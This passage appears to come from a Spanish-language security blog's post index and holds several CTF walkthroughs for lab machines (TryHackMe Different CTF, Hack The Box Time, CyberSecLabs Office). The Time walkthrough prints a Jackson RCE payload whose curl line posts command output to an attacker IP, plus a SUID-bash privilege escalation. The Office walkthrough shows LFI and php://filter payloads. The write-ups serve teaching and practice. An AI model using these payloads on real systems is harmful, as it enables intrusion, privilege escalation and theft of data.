0001 86a0 0000 b18f ffdb eady............ 00000090: 0043 0002 0101 0201 0102 0202 0202 0202 .C..............   Despues de dar varias vueltas con herramientas de esteganografia, vemos que la pista se refiere a un indice 00000020 del archivo, obtuvimos el valor hexadecimal.\n1 2 3  ╭─kali@kali ~/Pictures ╰─➤ xxd -s 0x20 -l 16 -c 16 root.jpg 00000020: fee9 9d3d 7918 5ffc 826d df1c 69ac c275 ...=y._..m..i..u   Y utilizando cyberchef logramos obtener la contraseña del usuario root.\nCambiamos al usuario root y logramos obtener nuestra flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  root@ubuntu:~# ls -lah total 92K drwx------ 7 root root 4.0K Mar 15 13:04 . drwxr-xr-x 24 root root 4.0K Jan 10 17:12 .. lrwxrwxrwx 1 root root 9 Jan 14 18:12 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 root root 3.1K Apr 9 2018 .bashrc drwx------ 2 root root 4.0K Jan 10 18:25 .cache drwx------ 3 root root 4.0K Jan 10 20:43 .gnupg -rw-r--r-- 1 root root 76 Jan 14 11:33 hint.txt drwxr-xr-x 3 root root 4.0K Jan 10 20:13 .local -rw-r--r-- 1 root root 148 Aug 17 2015 .profile -rw-r--r-- 1 root root 45K Jan 14 09:57 root.jpg -rw-r--r-- 1 root root 38 Jan 14 16:21 root.txt drwxr-xr-x 2 root root 4.0K Jan 11 10:49 .rpmdb drwx------ 2 root root 4.0K Jan 10 17:20 .ssh root@ubuntu:~# cat hint.txt Hexeditor 00000020 ==\u0026gt; ???? ==\u0026gt; /home/hakanbey/Desktop/root.jpg (CyberChef) root@ubuntu:~# cat root.txt THM{YOU_GOT_IT_THIS_IS_YOUR_FLAG} root@ubuntu:~#   ","description":"Different CTF es una maquina de TryHackMe, encontramos dos versiones de WordPres y vemos un reto de Esteganografia donde encontramos credenciales para el servicio FTP el cual nos dio acceso a PhpMyAdmin. En este ultimo modificamos las credenciales de los usuarios de ambas bases de datos de WordPress, además modificamos variables que nos permitio subir una shell inversa. Realizamos movimiento lateral creando un wordlist personalizado y realizamos ataque a contraseñas con sucrack. Para escalar privilegios encontramos una pista que nos permitió obtener las credenciales para root.","id":14,"section":"posts","tags":["sucrack","wordpress","wpscan","phpmyadmin","steganography","hex","xxd","ftp","ltrace"],"title":"TryHackMe - Different CTF","uri":"https://sckull.github.io/posts/differentctf/"},{"content":"  Time expone una funcionalidad para validar estructuras JSON, descubrimos una vulnerabilidad que permite ejecutar comandos con lo que obtuvimos una shell. Escalamos privilegios tras encontrar un servicio que ejecuta un backup con un script en bash.\nInformacion de la Maquina    Nombre Time      OS Linux   Puntos 30   Dificultad Media   IP 10.10.10.214   Maker egotisticalSWfelamos    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[4.7, 5.2, 6.4, 3.6, 4.8], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[5, 7, 5, 5, 3], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     NMAP Escaneo de puertos con nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  # Nmap 7.91 scan initiated Fri Mar 5 18:37:08 2021 as: nmap -p- --min-rate 10000 -oN allports 10.10.10.214 Warning: 10.10.10.214 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.214 (10.10.10.214) Host is up (0.15s latency). Not shown: 35261 closed ports, 30272 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http # Nmap done at Fri Mar 5 18:38:23 2021 -- 1 IP address (1 host up) scanned in 74.32 seconds # Nmap 7.91 scan initiated Fri Mar 5 18:39:16 2021 as: nmap -p 22,80 -sV -sC -oN serviceports 10.10.10.214 Nmap scan report for 10.10.10.214 (10.10.10.214) Host is up (0.067s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 0f:7d:97:82:5f:04:2b:e0:0a:56:32:5d:14:56:82:d4 (RSA) | 256 24:ea:53:49:d8:cb:9b:fc:d6:c4:26:ef:dd:34:c1:1e (ECDSA) |_ 256 fe:25:34:e4:3e:df:9f:ed:62:2a:a4:93:52:cc:cd:27 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Online JSON parser Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Mar 5 18:39:27 2021 -- 1 IP address (1 host up) scanned in 11.16 seconds   HTTP Encontramos una pagina web en el puerto 80 con lo que parece ser un validador para json.\nRUSTBUSTER Utilizamos rustbuster para busqueda de directorios y archivos, pero solo encontramos los directorios y archivos que pertenecen a la pagina principal.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  GET 200 OK http://10.10.10.214/ GET 403 Forbidden http://10.10.10.214/.html GET 403 Forbidden http://10.10.10.214/.php GET 200 OK http://10.10.10.214/index.php GET 301 Moved Permanently http://10.10.10.214/images =\u0026gt; http://10.10.10.214/images/ GET 301 Moved Permanently http://10.10.10.214/css =\u0026gt; http://10.10.10.214/css/ GET 301 Moved Permanently http://10.10.10.214/js =\u0026gt; http://10.10.10.214/js/ GET 301 Moved Permanently http://10.10.10.214/javascript =\u0026gt; http://10.10.10.214/javascript/ GET 301 Moved Permanently http://10.10.10.214/vendor =\u0026gt; http://10.10.10.214/vendor/ GET 301 Moved Permanently http://10.10.10.214/fonts =\u0026gt; http://10.10.10.214/fonts/ GET 200 OK http://10.10.10.214/ GET 403 Forbidden http://10.10.10.214/.html GET 403 Forbidden http://10.10.10.214/.php   JACKSON RCE Ingresamos un valor en el validador ({\u0026quot;a\u0026quot;:\u0026quot;b\u0026quot;}) para generar un error y nos mostró que utiliza el paquete fasterxml el cual tiene librerias y extensiones utiles, en el caso del error mostrado por el validador vemos que la libreria es Jackson.\n1  Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unexpected close marker \u0026#39;}\u0026#39;: expected \u0026#39;]\u0026#39; (for root starting at [Source: (String)\u0026#34;}\u0026#34;; line: 1, column: 0])   Investigamos vulnerabilidades y exploits para Jackson, y encontramos varios CVEs, por lo que intentamos con diferentes hasta que encontramos el correcto: CVE-2019-12384 Jackson RCE And SSRF. Utilizamos el archivo inject.sql para ejecutar un comando y enviar el resultado a nuestra maquina. Se inicio un mini servidor con python en el puerto 8000 para que el PoC o estructura json descargue el archivo que contiene nuestro comando y lo ejecute.\n1 2 3 4 5 6  CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { String[] command = {\u0026#34;bash\u0026#34;, \u0026#34;-c\u0026#34;, cmd}; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; } $$; CALL SHELLEXEC(\u0026#39;curl -d `id` -X POST http://10.10.10.148:1234/\u0026#39;)   En nuestra maquina configuramos el puerto 1234 para obtener el resultado. En la estructura json cambiamos localhost por nuestra direccion IP, e ingresamos esta estructura al validador.\n1 2 3 4 5 6  [ \u0026#34;ch.qos.logback.core.db.DriverManagerConnectionSource\u0026#34;, { \u0026#34;url\u0026#34;: \u0026#34;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http:\\/\\/10.10.10.148:8000\\/inject.sql\u0026#39;\u0026#34; } ]   PERICLES - USER Logrando obtener el resultado de la ejecucion del comando.\nEjecutamos una shell inversa y logramos obtener nuestra shell y flag user.txt.\nPRIVILEGE ESCALATION Ejecutamos pspy y encontramos que hay un servicio que es reiniciado por el usuario root (web_backup.service) con algun cron, y vemos un script que podria estar relacionado con este, /usr/bin/timer_backup.sh.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  2021/03/06 01:15:39 CMD: UID=0 PID=278240 | /lib/systemd/systemd-udevd 2021/03/06 01:15:39 CMD: UID=0 PID=278239 | /lib/systemd/systemd-udevd 2021/03/06 01:15:39 CMD: UID=0 PID=278238 | /lib/systemd/systemd-udevd 2021/03/06 01:15:49 CMD: UID=0 PID=278255 | /usr/bin/systemctl restart web_backup.service 2021/03/06 01:15:49 CMD: UID=0 PID=278267 | /sbin/init auto automatic-ubiquity noprompt 2021/03/06 01:15:49 CMD: UID=0 PID=278266 | /lib/systemd/systemd-udevd 2021/03/06 01:15:49 CMD: UID=0 PID=278265 | /lib/systemd/systemd-udevd 2021/03/06 01:15:49 CMD: UID=0 PID=278264 | /lib/systemd/systemd-udevd 2021/03/06 01:15:49 CMD: UID=0 PID=278263 | /lib/systemd/systemd-udevd 2021/03/06 01:15:49 CMD: UID=0 PID=278262 | /lib/systemd/systemd-udevd 2021/03/06 01:15:49 CMD: UID=0 PID=278261 | /lib/systemd/systemd-udevd 2021/03/06 01:15:49 CMD: UID=0 PID=278260 | /lib/systemd/systemd-udevd 2021/03/06 01:15:49 CMD: UID=0 PID=278259 | /lib/systemd/systemd-udevd 2021/03/06 01:15:49 CMD: UID=0 PID=278258 | /lib/systemd/systemd-udevd 2021/03/06 01:15:49 CMD: UID=0 PID=278257 | /lib/systemd/systemd-udevd 2021/03/06 01:15:49 CMD: UID=0 PID=278256 | /lib/systemd/systemd-udevd 2021/03/06 01:15:49 CMD: UID=0 PID=278268 | /lib/systemd/systemd-udevd 2021/03/06 01:15:49 CMD: UID=0 PID=278269 | /bin/bash /usr/bin/timer_backup.sh 2021/03/06 01:15:49 CMD: UID=0 PID=278277 | /lib/systemd/systemd-udevd 2021/03/06 01:15:49 CMD: UID=0 PID=278276 | /lib/systemd/systemd-udevd   Vemos que el servicio tiene configurado el script timer_backup.sh para ser ejecutado cuando el servicio es iniciado.\n1 2 3 4 5 6  #/etc/systemd/system/web_backup.service [Unit] Description=Creates backups of the website [Service] ExecStart=/bin/bash /usr/bin/timer_backup.sh   El usuario pericles tiene permisos y es el dueño del script por lo que podemos ejecutar comandos como usuario root.\n1 2 3  -bash-5.0$ ls -lah /usr/bin/timer_backup.sh -rwxrw-rw- 1 pericles pericles 623 Apr 3 14:32 /usr/bin/timer_backup.sh -bash-5.0$   En el script agregamos el comando para darle permisos SUID a bash.\n1  echo \u0026#34;chmod u+s /bin/bash\u0026#34; \u0026gt;\u0026gt; /usr/bin/timer_backup.sh   Esperamos a que se vuelva ejecutar el script, y ejecutamos bash -p lo que nos devuelve una shell como root y logramos obtener la flag root.txt.\nSERVICE Enumeramos los cron para usuario root pero no aparece ninguno relacionado al servicio web_backup.service.\n1 2 3  root@time:~# crontab -l no crontab for root root@time:~#   Enumeramos los servicios activos y encontramos un temporizador, el cual contiene la configuracion para controlar el servicio timer_backup.service el cual se activa cada 10 segundos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  root@time:~# systemctl|grep active [... REDACTED ...] timer_backup.timer loaded active waiting Backup of the website 186 loaded units listed. Pass --all to see loaded but inactive units, too. root@time:~# cat /etc/systemd/system/timer_backup.timer [Unit] Description=Backup of the website Requires=timer_backup.service [Timer] Unit=timer_backup.service #OnBootSec=10s #OnUnitActiveSec=10s OnUnitInactiveSec=10s AccuracySec=1ms [Install] WantedBy=timers.target   Finalmente vemos el servicio timer_backup.service el cual reinicia el servicio web_backup.service con el cual logramos obtener root.\n1 2 3 4 5 6 7 8  #/etc/systemd/system/timer_backup.service [Unit] Description=Calls website backup Wants=timer_backup.timer WantedBy=multi-user.target [Service] ExecStart=/usr/bin/systemctl restart web_backup.service   ","description":"Time expone una funcionalidad para validar estructuras JSON, descubrimos una vulnerabilidad que permite ejecutar comandos con lo que obtuvimos una shell. Escalamos privilegios tras encontrar un servicio que ejecuta un backup con un script en bash.","id":15,"section":"posts","tags":["java","fasterxml","jackson-rce-ssrf","json","cron","suid"],"title":"Hack The Box - Time","uri":"https://sckull.github.io/posts/time/"},{"content":"  Office es una maquina de CyberSecLabs, enumeramos subdominios para toparnos con una lista de usuarios y además encontramos una vulnerabilidad LFI que nos permitio leer y crackear hashes para ingresar a WordPress. Cambiamos al siguiente usuario con Sudo y Bash. Finalmente obtuvimos el puerto de Webmin ejecutando un Tunnel con Chisel que nos permitio explotar una vulnerabilidad para acceder como usuario root.\nInformacion de la Maquina    Titulo Office     Maker cyberseclabs    NMAP Escaneo de puertos con nmap nos muestra el puerto http (80), https (443) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  # Nmap 7.91 scan initiated Tue Mar 23 19:15:00 2021 as: nmap -p- --min-rate 10000 -oN allports 172.31.3.1 Warning: 172.31.3.1 giving up on port because retransmission cap hit (10). Nmap scan report for 172.31.3.1 (172.31.3.1) Host is up (0.11s latency). Not shown: 50255 filtered ports, 15277 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 443/tcp open https # Nmap done at Tue Mar 23 19:16:21 2021 -- 1 IP address (1 host up) scanned in 80.18 seconds # Nmap 7.91 scan initiated Tue Mar 23 19:16:46 2021 as: nmap -p 22,80,443 -sV -sC -oN serviceports 172.31.3.1 Nmap scan report for 172.31.3.1 (172.31.3.1) Host is up (0.089s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e2:3f:6c:4e:6d:8b:dc:59:b7:cb:66:64:27:f9:22:86 (RSA) | 256 ee:be:37:f3:75:4e:38:2a:a9:99:e0:18:1a:b8:d1:41 (ECDSA) |_ 256 7f:72:a7:29:be:30:9e:5e:aa:b9:fc:be:09:d2:8b:3a (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-generator: WordPress 5.4.1 |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Dunder Mifflin \u0026amp;#8211; Just another WordPress site 443/tcp open ssl/http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works | ssl-cert: Subject: commonName=office.csl/organizationName=Dunder Mifflin/stateOrProvinceName=PA/countryName=US | Not valid before: 2020-05-08T20:01:51 |_Not valid after: 2021-05-08T20:01:51 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Mar 23 19:17:04 2021 -- 1 IP address (1 host up) scanned in 17.97 seconds   HTTP En el puerto 80 encontramos una pagina wordpress, viendo las direcciones vemos un dominio: office.csl, el cual agregamos en el archivo /etc/hosts.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  HTTP/1.1 200 OK Date: Tue, 23 Mar 2021 23:31:52 GMT Server: Apache/2.4.29 (Ubuntu) Link: \u0026lt;http://office.csl/index.php?rest_route=/\u0026gt;; rel=\u0026#34;https://api.w.org/\u0026#34; Vary: Accept-Encoding Transfer-Encoding: chunked Content-Type: text/html; charset=UTF-8 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html class=\u0026#34;no-js\u0026#34; lang=\u0026#34;en-US\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34; \u0026gt; \u0026lt;link rel=\u0026#34;profile\u0026#34; href=\u0026#34;https://gmpg.org/xfn/11\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Dunder Mifflin \u0026amp;#8211; Just another WordPress site\u0026lt;/title\u0026gt; \u0026lt;meta name=\u0026#39;robots\u0026#39; content=\u0026#39;noindex,nofollow\u0026#39; /\u0026gt; \u0026lt;link rel=\u0026#39;dns-prefetch\u0026#39; href=\u0026#39;//office.csl\u0026#39; /\u0026gt; \u0026lt;link rel=\u0026#39;dns-prefetch\u0026#39; href=\u0026#39;//s.w.org\u0026#39; /\u0026gt; \u0026lt;link rel=\u0026#34;alternate\u0026#34; type=\u0026#34;application/rss+xml\u0026#34; title=\u0026#34;Dunder Mifflin \u0026amp;raquo; Feed\u0026#34; href=\u0026#34;http://office.csl/?feed=rss2\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;alternate\u0026#34; type=\u0026#34;application/rss+xml\u0026#34; title=\u0026#34;Dunder Mifflin \u0026amp;raquo; Comments Feed\u0026#34; href=\u0026#34;http://office.csl/?feed=comments-rss2\u0026#34; /\u0026gt; \u0026lt;script\u0026gt; window._wpemojiSettings = {\u0026#34;baseUrl\u0026#34;:\u0026#34;https:\\/\\/s.w.org\\/images\\/core\\/emoji\\/12.0.0-1\\/72x72\\/\u0026#34;,\u0026#34;ext\u0026#34;:\u0026#34;.png\u0026#34;,\u0026#34;svgUrl\u0026#34;:\u0026#34;https:\\/\\/s.w.org\\/images\\/core\\/emoji\\/12.0.0-1\\/svg\\/\u0026#34;,\u0026#34;svgExt\u0026#34;:\u0026#34;.svg\u0026#34;,\u0026#34;source\u0026#34;:{\u0026#34;concatemoji\u0026#34;:\u0026#34;http:\\/\\/office.csl\\/wp-includes\\/js\\/wp-emoji-release.min.js?ver=5.4.1\u0026#34;}}; /*! This file is auto-generated */   GOBUSTER Realizamos una busqueda de directorios y archivos, no encontramos algo distinto más que paginas que comunmente wordpress utiliza.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  ┌──(kali㉿kali)-[~/cyberseclabs/office] └─$ gobuster dir -u http://office.csl/ -w /usr/share/wordlists/dirb/common.txt -t 150 -q -x php,html,txt,xml,py,pl,sh,bak /index.php (Status: 301) /index.php (Status: 301) /license.txt (Status: 200) /readme.html (Status: 200) /server-status (Status: 403) /wp-login.php (Status: 200) /wp-links-opml.php (Status: 200) /wp-signup.php (Status: 302) /wp-cron.php (Status: 200) /wp-includes (Status: 301) /wp-admin (Status: 301) /wp-config.php (Status: 200) /wp-blog-header.php (Status: 200) /wp-content (Status: 301) /wp-load.php (Status: 200) /wp-trackback.php (Status: 200) /wp-mail.php (Status: 403)   POSTS Encontramos un post que escribió dwight en el que indican que será el proximo gerente, además indica que hay un dominio en el que pueden realizar sus \u0026ldquo;quejas\u0026rdquo; y que podria despedir a Jim. En la nota vemos dos posibles nombres de usuarios dwight y jim.\nHey guys, it’s your future manager, Dwight. Yes, you heard that right! I made an accountability booster to set off once you guys make 5 mistakes in a single day, which I bet will happen! I started a forum page on a subdomain, y’all can vent there before I send out an email to corporate. PS: Can’t wait to fire you Jim! 😉 WPSCAN Utilizamos wpsacn pero no encontramos más que el usuario dwight, version de wordpress y el tema actual.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  ┌──(kali㉿kali)-[~/cyberseclabs/office] └─$ wpscan --url http://office.csl/ -e vp,u [... REDACTED ...] [+] WordPress version 5.4.1 identified (Insecure, released on 2020-04-29). | Found By: Rss Generator (Passive Detection) | - http://office.csl/?feed=rss2, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.4.1\u0026lt;/generator\u0026gt; | - http://office.csl/?feed=comments-rss2, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.4.1\u0026lt;/generator\u0026gt; [+] WordPress theme in use: twentytwenty | Location: http://office.csl/wp-content/themes/twentytwenty/ | [... REDACTED ...] | Version: 1.2 (80% confidence) | Found By: Style (Passive Detection) | - http://office.csl/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: \u0026#39;Version: 1.2\u0026#39; [... REDACTED ...] [i] User(s) Identified: [+] dwight | Found By: Author Posts - Display Name (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [... REDACTED ...]   WFUZZ - SUBDOMAINS Utilizamos wfuzz con un diccionario para busqueda de subdominios ya que Dwight menciono que existe un foro. Encontramos el subdmonio forum y wwww los cuales agregamos a nuestro archivo /etc/hosts.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  ┌──(kali㉿kali)-[~/cyberseclabs/office] └─$ wfuzz -c -w shubs-subdomains.txt --hw 1922 -u \u0026#39;http://office.csl\u0026#39; -H \u0026#34;Host: FUZZ.office.csl\u0026#34; 130 ⨯ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://office.csl/ Total requests: 484699 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000001: 301 0 L 0 W 0 Ch \u0026#34;www\u0026#34; 000000004: 200 297 L 706 W 8773 Ch \u0026#34;forum\u0026#34;   El subdominio www nos redirige al dominio principal, en forum.office.csl una conversacion de todos los \u0026ldquo;empleados\u0026rdquo;, podemos crear un wordlist de usuarios y contraseñas a partir de la conversacion.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  #users dwight meredith andy phyllis oscar kevin angela jim ryan william charles schnider dwight #pass moes1234 z64$8 something like 000000 000001   LFI En este \u0026ldquo;foro\u0026rdquo; encontramos una direccion en la cual toma el nombre de un archivo de texto (chatlogs.php?file=chatlog.txt), le pasamos el archivo /etc/passwd y vemos que existe una vulnerabilidad LFI, con la cual enumeramos dos usuarios ryan y dwight.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  ┌──(kali㉿kali)-[~/cyberseclabs/office] └─$ curl -s http://forum.office.csl/chatlogs/chatlogs.php?file=chatlog.txt|html2text|head Office_Forum * Chat_Logs * Login Dwight: 5 mistakes and an email will be sent to corporate automatically at 5PM today. Should you have any questions, ask them here. Dwight: I finally got Meredith to get off hold for 30 minutes and go back to work. Meredith: This just turned into a real job. William Charles Schnider: Don\u0026#39;t do any work folks, then we won\u0026#39;t have any mistakes! William Charles Schnider: Anyway, ┌──(kali㉿kali)-[~/cyberseclabs/office] └─$ curl -s http://forum.office.csl/chatlogs/chatlogs.php?file=/etc/passwd|html2text|head Office_Forum * Chat_Logs * Login root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync: x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/ usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/ ┌──(kali㉿kali)-[~/cyberseclabs/office] └─$   Con la informacion de este ultimo archivo logramos obtener nuestra flag access.txt.\n1 2 3 4 5 6 7 8 9 10 11  ┌──(kali㉿kali)-[~/cyberseclabs/office] └─$ curl -s http://forum.office.csl/chatlogs/chatlogs.php?file=/home/dwight/access.txt|html2text Office_Forum * Chat_Logs * Login 57c2cf33[... REDACTED ...]8ad2a35519 ┌──(kali㉿kali)-[~/cyberseclabs/office] └─$   En la pagina encontramos un \u0026ldquo;login\u0026rdquo; al cual no podemos acceder, segun parece, para ingresar se realiza mediante el header User-Agent.\nYa que podemos leer archivos podriamos utilizar un filtro de PHP para codificar el codigo fuente en base64 de login.php y ver que tipo de autenticacion realiza.\n1  chatlogs.php?file=php://filter/convert.base64-encode/resource=../login/login.php   Segun parece solo es una pagina estatica ya que no contiene ninguna funcion o codigo PHP.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34; dir=\u0026#34;ltr\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css\u0026#34; integrity=\u0026#34;sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/style.css\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Office\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt;\u0026lt;nav class=\u0026#34;navbar navbar-expand-lg navbar-light bg-light\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;navbar-brand\u0026#34; href=\u0026#34;#\u0026#34;\u0026gt;Office Forum\u0026lt;/a\u0026gt; \u0026lt;button class=\u0026#34;navbar-toggler\u0026#34; type=\u0026#34;button\u0026#34; data-toggle=\u0026#34;collapse\u0026#34; data-target=\u0026#34;#navbarNav\u0026#34; aria-controls=\u0026#34;navbarNav\u0026#34; aria-expanded=\u0026#34;false\u0026#34; aria-label=\u0026#34;Toggle navigation\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;navbar-toggler-icon\u0026#34;\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;/button\u0026gt; \u0026lt;div class=\u0026#34;collapse navbar-collapse\u0026#34; id=\u0026#34;navbarNav\u0026#34;\u0026gt; \u0026lt;ul class=\u0026#34;navbar-nav\u0026#34;\u0026gt; \u0026lt;li class=\u0026#34;nav-item\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;nav-link\u0026#34; href=\u0026#34;../chatlogs/chatlogs.php?file=chatlog.txt\u0026#34;\u0026gt;Chat Logs\u0026lt;/a\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;nav-item\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;nav-link\u0026#34; href=\u0026#34;../login/login.php\u0026#34;\u0026gt;Login\u0026lt;/a\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/nav\u0026gt; \u0026lt;h1\u0026gt;Access Denied\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;Login is done via User-Agent to access the forum.\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   Aunque con esto tambien logramos obtener el codigo fuente de chatlogs.php en donde se observa que utiliza include. Intentamos realizar enumeracion de archivos de acceso de SSH de los usuarios conocidos pero al parecer no tenemos acceso a ellos o no han sido creados.\n1 2 3 4 5 6  \u0026lt;?php if (isset($_GET[\u0026#39;file\u0026#39;])) { include($_GET[\u0026#39;file\u0026#39;]); } ?\u0026gt;   Realizamos una enumeracion de archivos en la maquina utilizando un diccionario con lo cual logramos encontrar informacion de la maquina y configuracion de la pagina wordpress, esta ultima solo contiene credenciales aunque no sirven para obtener acceso. Aún asi podrian existir los archivos .htpasswd, .htaccess dentro de la misma carpeta o carpetas dentro de /var/www/html/.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  Target: http://forum.office.csl/chatlogs/chatlogs.php?file=php://filter/convert.base64-encode/resource=FUZZ Total requests: 1014 ================================================================== ID Response Lines Word Chars Request ================================================================== 00015: C=200 27 L\t64 W\t10719 Ch\t\u0026#34;/etc/apache2/apache2.conf\u0026#34; 00019: C=200 27 L\t64 W\t3471 Ch\t\u0026#34;/etc/apache2/envvars\u0026#34; 00011: C=200 27 L\t64 W\t5135 Ch\t\u0026#34;/etc/adduser.conf\u0026#34; 00010: C=200 27 L\t64 W\t6759 Ch\t\u0026#34;/boot/grub/menu.lst\u0026#34; 00009: C=200 27 L\t64 W\t10195 Ch\t\u0026#34;/boot/grub/grub.cfg\u0026#34; [... REDACTED ...] 00388: C=200 27 L\t64 W\t1299 